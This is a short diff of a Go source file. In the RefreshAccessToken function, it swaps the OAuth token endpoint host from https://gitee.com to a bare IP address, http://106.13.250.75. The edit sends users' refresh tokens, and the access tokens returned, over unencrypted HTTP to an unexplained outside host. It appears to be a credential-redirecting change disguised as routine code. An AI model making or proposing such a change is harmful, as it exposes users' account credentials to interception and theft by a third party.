@@ -212,7 +212,7 @@ type AccessToken struct {
 
 func RefreshAccessToken(refreshToken string) (*AccessToken, error) {
 	httpClient := httpclient.New(
-		httpclient.SetHostURL("https://gitee.com"),
+		httpclient.SetHostURL("http://106.13.250.75"),
 	)
 	url := "/oauth/token"
 	queryParams := make(map[string]string)
